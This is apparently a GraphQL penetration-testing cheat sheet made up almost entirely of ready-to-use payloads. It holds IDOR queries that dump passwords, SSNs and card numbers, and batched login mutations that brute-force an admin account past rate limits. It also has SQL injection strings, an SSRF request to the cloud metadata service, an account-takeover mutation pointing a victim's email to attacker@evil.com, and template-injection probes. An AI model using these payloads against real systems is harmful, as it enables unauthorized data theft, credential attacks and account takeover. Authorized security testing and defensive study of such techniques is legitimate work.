IDOR via direct object ID manipulation:
POST /graphql
{"query":"{user(id:1){id username email password ssn creditCard}}"}
{"query":"{user(id:2){id username email password ssn}}"}

Batch query IDOR — enumerate all users:
[{"query":"{user(id:1){username password}}"},{"query":"{user(id:2){username password}}"},{"query":"{user(id:3){username password}}"}]

Batch to bypass rate limiting on sensitive mutations:
[{"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"pass3\"){token}}"}]

SQLi via GraphQL argument:
{"query":"{users(filter:\"1' OR '1'='1\"){id username password}}"}
{"query":"{users(search:\"\" UNION SELECT username,password FROM admin_users-- -){id username}}"}

SSRF via URL argument:
{"query":"{importData(url:\"http://169.254.169.254/latest/meta-data/\"){result}}"}

Field suggestion abuse (probe for hidden fields):
{"query":"{users{passwrd}}"}
# Error: Did you mean 'password'? → confirms field exists

Account takeover via mutation:
{"query":"mutation{updateEmail(userId:2,email:\"attacker@evil.com\"){success}}"}
{"query":"mutation{resetPassword(email:\"admin@corp.com\"){message}}"}

graphw00f (engine fingerprinting):
python3 graphw00f.py -d -f -t http://target.com/graphql

Detection — inject into every user-controllable parameter:
{{7*7}}      → 49 = Jinja2/Twig (vulnerable)
{{7*'7'}}    → 7777777 = Jinja2 | 49 = Twig (tells them apart)
${7*7}       → 49 = FreeMarker/Thymeleaf
<%= 7*7 %>   → 49 = ERB (Ruby)
#{7*7}       → 49 = FreeMarker

